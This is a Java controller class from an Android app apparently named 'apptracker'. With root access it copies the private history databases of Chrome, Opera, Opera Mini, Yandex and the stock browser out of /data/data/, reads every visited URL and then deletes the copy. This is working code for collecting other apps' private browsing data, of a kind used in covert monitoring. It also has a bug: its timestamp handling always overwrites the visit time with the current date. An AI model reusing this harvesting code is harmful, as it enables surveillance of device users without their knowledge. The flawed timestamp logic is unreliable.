package com.frostweepgames.apptracker.controllers;

import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.util.Log;

import com.frostweepgames.apptracker.models.BrowsersHistoryModel;
import com.frostweepgames.apptracker.Helper;
import com.frostweepgames.apptracker.core.IController;
import com.frostweepgames.apptracker.settings.Constants;
import com.stericson.RootTools.RootTools;

import java.util.ArrayList;
import java.util.List;

/**-------------------------------
 * Created by artem on 21.02.2018.
 * Powered by Frostweep Games
 * All rights reserved!
 * (c)2013-2018
 * www.frostweepgames.com
 ---------------------------------*/
public class GetBrowsersHistoryController implements IController {

    private Activity _currentActivity;
    private Context _currentContext;

    private String _storagePath;

    private ArrayList<BrowserInfo> _browsersInfos;
    private ArrayList<BrowsersHistoryModel> _browsersHistory;


    public GetBrowsersHistoryController(Activity currentActivity) {

        _currentActivity = currentActivity;
        _currentContext = currentActivity.getApplicationContext();
        _browsersHistory = new ArrayList<BrowsersHistoryModel>();
        fillBrowsersInfos();
    }

    public GetBrowsersHistoryController(Context context) {

        _currentContext = context;
        _browsersHistory = new ArrayList<BrowsersHistoryModel>();
        fillBrowsersInfos();
    }

    public Object getContent() {

        _browsersHistory.clear();

        _storagePath = Environment.getExternalStorageDirectory().getAbsolutePath() + Constants.DEFAULT_HISTORY_DB_PATH;

        if (Helper.isDeviceRooted()) {
            for (BrowserInfo browser : _browsersInfos) {
                try {
                    if (RootTools.exists(browser.historyDBPath)) {
                        RootTools.copyFile(browser.historyDBPath, _storagePath, false, false);
                        RootTools.remount(_storagePath, "RW");
                        loadHistoryFromDatabase(_storagePath, browser);
                        Helper.deleteFile(_storagePath);
                    }
                } catch (Exception ex) {
                }
            }
        } else {
            Helper.drawSystemMessageTooltip(_currentContext, "Browser history isn't available");
        }

        return _browsersHistory;
    }


    private void fillBrowsersInfos() {
        _browsersInfos = new ArrayList<BrowserInfo>();

        _browsersInfos.add(new BrowserInfo("/data/data/com.android.chrome/app_chrome/Default/History", "urls", 1, 2, "Chrome", "com.android.chrome"));
        _browsersInfos.add(new BrowserInfo("/data/data/com.android.browser/databases/browser2.db", "history", 2, 4, "Native Browser", "com.android.browser"));
        _browsersInfos.add(new BrowserInfo("/data/data/com.opera.browser/app_opera/History", "urls", 1, 5, "Opera", "com.opera.browser"));
        _browsersInfos.add(new BrowserInfo("/data/data/com.opera.mini.native/app_opera/History", "urls", 1, 5, "Opera Mini", "com.opera.mini.native"));
        _browsersInfos.add(new BrowserInfo("/data/data/com.yandex.browser/app_chromium/Default/History", "urls", 1, 5, "Yandex", "com.yandex.browser"));
        // _browsersInfos.add(new BrowserInfo("/data/data/org.mozilla.firefox/files/mozilla/" + Helper.getFileNameThatEndsBy("/data/data/org.mozilla.firefox/files/mozilla/", ".default") + "/browser.db", "history", 2, 7, "Firefox"));
    }


    private void loadHistoryFromDatabase(String pathToDB, BrowserInfo browser) {
        SQLiteDatabase database = SQLiteDatabase.openDatabase(pathToDB, null, 0);

        String query = "SELECT * FROM " + browser.historyTable;

        Cursor cursor = database.rawQuery(query, null);

        BrowsersHistoryModel browsersHistoryModel;
        while (cursor.moveToNext()) {
            try {
                browsersHistoryModel = new BrowsersHistoryModel();
                browsersHistoryModel.url = cursor.getString(browser.urlColumnIndex);
                browsersHistoryModel.browserName = browser.browserName;
                browsersHistoryModel.versionName = browser.getBrowserVersion();

                try {
                    browsersHistoryModel.tm = cursor.getLong(browser.lastVisitDateColumnIndex);
                } finally {
                    browsersHistoryModel.tm = Helper.getTimestampFromDate(Helper.getCurrentDate());
                }

                _browsersHistory.add(browsersHistoryModel);
            } catch (Exception ex) {

                Log.e("ERROR LOAD DATA BROWSER", ex.getMessage());
            }
        }
    }


    public class BrowserInfo {
        public String historyDBPath;
        public String historyTable;

        public Integer urlColumnIndex;
        public Integer titleColumnIndex;
        public Integer lastVisitDateColumnIndex;
        public Integer visitCountColumnIndex;

        public String browserName;
        public String packageName;

        public BrowserInfo(String dbPath, String table, Integer urlColumn, Integer lastVisitColumn, String browser, String pckg) {
            historyDBPath = dbPath;
            historyTable = table;
            urlColumnIndex = urlColumn;
            lastVisitDateColumnIndex = lastVisitColumn;
            browserName = browser;
            packageName = pckg;
        }

        public String getBrowserVersion() {
            final PackageManager pm = _currentContext.getPackageManager();

            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

            PackageInfo pInfo;
            for (ApplicationInfo packageInfo : packages) {
                if (packageInfo.packageName.equals(packageName)) {
                    try {
                        pInfo = pm.getPackageInfo(packageInfo.packageName, 0);
                        return pInfo.versionName;
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    }
                }
            }
            return "1.0";
        }
    }
}
